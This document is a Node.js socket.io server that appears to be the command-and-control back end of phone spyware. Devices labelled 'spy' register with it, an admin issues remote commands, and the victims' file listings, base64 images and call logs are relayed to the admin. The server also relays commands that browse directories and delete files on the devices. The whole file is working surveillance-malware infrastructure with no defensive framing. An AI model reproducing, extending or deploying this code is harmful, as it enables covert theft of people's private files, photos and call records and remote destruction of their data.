//port
const express = require("express");
var http = require("http");
const app = express();
const port = process.env.port || 3000;
var server = http.createServer(app);
var io = require("socket.io")(server);

app.use(express.json());
console.log("waiting for a device Connect, at port 3000");

const device_secure_ids = {};
const device_socket_ids = {};

var admin_socket_id;
var admin_status = false;
var call_ones = false;

io.on("connection", (socket) => {
  console.log("device connected");

  //spy connect Event
  socket.on("spy_connect", (device_id, device_name) => {
    device_secure_ids[device_id] = socket.id;
    device_socket_ids[socket.id] = device_id;
    if (admin_status == true) {
      io.to(admin_socket_id).emit("spy_connected", {
        device_id: device_id,
        device_name: device_name,
      });
    } else {
      console.log("Unable To Send Data to Admin Reason Admin Offline");
    }
    console.log(device_id);
    console.log(device_name);
  });

  //HeartBeat
  function sendHeartBeat() {
    setTimeout(sendHeartBeat, 8000);
    io.emit("ping");
  }

  //pong Received
  socket.on("pong", (from) => {
    var d = new Date();
    console.log("HeartBeat Received from " + from + " at " + d);
  });

  //admin connect Event
  socket.on("admin_connect", () => {
    admin_socket_id = socket.id;
    admin_status = true;
    io.emit("admin_connected");
    console.log("admin_connected");
  });

  //send command
  socket.on("send_command", (command, to_device) => {
    io.to(device_secure_ids[to_device]).emit(command);
    console.log(command);
    console.log(to_device);
  });
  socket.on("files_list",(list)=>{
    io.to(admin_socket_id).emit("files_l",list)
    console.log(list)
  })
  socket.on("dir_change",(dir,too)=>{
    console.log(dir);
    io.to(device_secure_ids[too]).emit("change_dir",dir);

  })
  socket.on("new_files",(list) =>{
    console.log(list);
    console.log("list");
    io.to(admin_socket_id).emit("new_dir",list);
  })
  socket.on("empty_dir", ()=>{
    io.to(admin_socket_id).emit("empty_dir");
    console.log("empty dir")

  })
  socket.on("not_dir", ()=>{
    io.to(admin_socket_id).emit("not_dir");
    console.log("not dir")

  })
  socket.on("send_image_bitmap",(path,too)=>{
    //receive_image_bitmap
    io.to(device_secure_ids[too]).emit("send_img_bit",path);
    console.log("dfsfds")

  })
  socket.on("base64_image",(base)=>{
    io.to(admin_socket_id).emit("receive_image_bitmap",base);
    console.log(base)

  })
  socket.on("multi_del_c",()=>{
    io.to(admin_socket_id).emit("multi_del_comp");

  })
  socket.on("delete_file_multi", (def_path,data,too)=>{
    console.log(data)
    io.to(device_secure_ids[too]).emit("delete_multi",def_path,data);
   
  })
  socket.on(
    "spy_call_logs",
    (number_list, name_list, call_type, duration_list) => {
      console.log(name_list);
      console.log(number_list);
      console.log(duration_list);
      console.log(call_type);
      io.to(admin_socket_id).emit(
        "call_logs_data",
        name_list,
        number_list,
        duration_list,
        call_type
      );
    }
  );

  //disconnect Event
  socket.on("disconnect", function (reason) {
    if (socket.id == admin_socket_id) {
      console.log("admin disconnected " + reason);
      admin_status = false;
    } else {
      if (admin_status == true) {
        io.to(admin_socket_id).emit("spy_disconnected", {
          device_id: device_socket_ids[socket.id],
        });
      }
      console.log(
        "connection disconnect From Device : " +
          device_socket_ids[socket.id] +
          " Reason " +
          reason
      );
      io.to(admin_socket_id).emit("ok")

    }
  });

  //close Event
  socket.on("close", (resCode, des) => {
    console.log("connection closed");
    console.log(resCode);
    console.log(des);
  });
  if (call_ones == false) {
    setTimeout(sendHeartBeat, 8000);
    call_ones = true;
  }
});
server.listen(port, "0.0.0.0", () => {
  console.log("server started");
});
